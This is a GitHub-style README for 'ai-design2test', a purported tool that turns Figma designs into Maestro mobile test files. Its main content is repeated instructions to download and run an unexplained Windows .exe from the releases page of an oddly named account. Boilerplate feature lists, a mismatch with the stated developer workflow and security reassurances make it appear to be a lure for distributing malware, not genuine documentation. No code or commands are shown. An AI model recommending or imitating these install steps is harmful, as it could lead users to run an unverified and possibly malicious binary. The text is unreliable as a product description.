# 🤖 ai-design2test - Automate mobile app testing from designs

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Campaignhatsecretin185/ai-design2test/releases)

This application helps teams turn design files into functional tests for mobile devices. It reads Figma designs and creates automation flows without requiring manual script writing. Use this tool to check app features, verify screen navigation, and manage regression suites.

## 📥 Getting Started

1. Visit [this release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) to access the application files.
2. Look for the file ending in `.exe` under the latest release version.
3. Click the file name to start the download.
4. Save the file to your desktop or a folder you can find.
5. Open the folder where you saved the installer.
6. Double-click the file to launch the setup program.
7. Follow the prompts on your screen to complete the installation.
8. Locate the program icon on your desktop or in your start menu to open the platform.

## 🛠 Prerequisites

Ensure your computer meets these requirements to run the software:

*   **Operating System:** Windows 10 or 11.
*   **Memory:** At least 8 gigabytes of RAM.
*   **Processor:** A modern dual-core chip or better.
*   **Storage:** 500 megabytes of free disk space.
*   **Network:** An active internet connection to communicate with Figma during the design import process.

## 📋 Core Features

The platform provides a complete workflow for test automation from visual design assets:

*   **Design Import:** Upload Figma context and design images. The tool extracts relevant UI details automatically.
*   **Smart Context Retrieval:** A built-in database layer searches your design history and notes to provide context for test steps.
*   **Test Case Generation:** The system turns designs into structured test cases. It saves these cases to a local database for future use.
*   **Automated Conversion:** The app converts internal test steps into ready-to-use YAML files for Maestro.
*   **Selective Regression:** Pick specific features, screens, or changes to test. This keeps your test cycles fast and relevant.
*   **Dry Run Mode:** Test your logic without executing actions on an actual mobile device.

## ⚙️ How it Works

The software acts as a middle layer between your design team and your testing setup. It bridges the gap by mapping visual elements to executable actions.

1. **Import Stage:** You upload design images into the dashboard. The system analyzes the buttons, input fields, and layouts.
2. **Analysis Stage:** The engine checks your project history to identify what needs testing based on recent updates.
3. **Creation Stage:** You generate test scenarios. The tool writes the specific steps required to navigate your app.
4. **Export Stage:** The platform produces files that your testing executors read to perform the actual checks on your phone or emulator.

## 🚀 Running Your First Test

After you install the software, connect your testing environment. You need a device connected via USB or a running mobile emulator.

1. Open the application.
2. Select your project folder.
3. Upload the design files you want to verify.
4. Review the generated test steps in the side panel. 
5. Select the tests you want to execute.
6. Click the Run button.
7. Observe the progress bar and the results window as the system performs the actions on your mobile app.

## 💾 Saving and Loading

The application uses a local SQLite database. This keeps your data on your computer instead of the cloud. Every test case you generate gets saved automatically. To move projects between computers, find the database file in your installation directory and move it to the new machine.

## 🔍 Troubleshooting

*   **App fails to open:** Restart your computer and try launching the program again.
*   **Cannot find design images:** Ensure your Figma project links are correct and your internet connection is stable.
*   **Tests do not start:** Check that your mobile device or emulator is visible to Windows.
*   **Database error:** Close other programs that might be accessing the data folder and restart the application.

## 💬 Frequently Asked Questions

**Do I need to know how to code to use this?**
No. The interface handles the logic behind the scenes. You simply select designs and confirm test steps.

**Can I run tests on an iPhone?**
Yes. As long as your testing executor is configured to communicate with your iOS device or simulator, this tool will generate the necessary files.

**Where can I find the latest version?**
Always check the [official release page](https://github.com/Campaignhatsecretin185/ai-design2test/releases) for the most current installer. Updates contain stability fixes and new features for test generation.

**Is my data secure?**
Because the database lives on your local machine, your design context and test cases remain within your workspace. Nothing is shared with external servers unless you specifically configure an external integration.